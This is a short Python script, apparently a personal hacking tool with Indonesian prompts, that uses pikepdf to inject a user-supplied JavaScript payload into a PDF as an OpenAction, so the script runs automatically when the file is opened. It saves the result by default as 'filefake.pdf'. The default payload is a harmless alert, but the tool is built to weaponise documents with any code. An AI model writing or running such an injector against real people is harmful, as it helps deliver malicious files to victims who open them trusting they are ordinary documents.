import pikepdf


def inject_js_to_pdf(input_pdf, output_pdf, payload=None):

    if payload is None or payload.strip() == "":
        payload = "app.alert('aditiya ganteng');"

  
    with pikepdf.open(input_pdf) as pdf:
    
        js_action = pikepdf.Dictionary({
            "/S": pikepdf.Name("/JavaScript"),
            "/JS": pikepdf.Stream(pdf, payload.encode('utf-8'))
        })

        pdf.Root["/OpenAction"] = js_action

        pdf.save(output_pdf)

print("|=======================================================|")
print("|\t\tInjection pdf\t\t\t\t|")
print("|Ig:aditiya.subakti\t|in:aditiya.subakti\t\t|")
print("|=======================================================|\n")

input_pdf_name = input("masukan nama file pdf anda (exampel file.pdf): ")
output_pdf_name = input("simpan pdf dengan nama (example 'filefake.pdf'): ")
if not output_pdf_name.strip():  
    output_pdf_name = "filefake.pdf"  
js_payload = input("masukan payload JavaScript(leave blank for default:app.alert('aditiya ganteng');): ")

inject_js_to_pdf(input_pdf_name, output_pdf_name, js_payload)

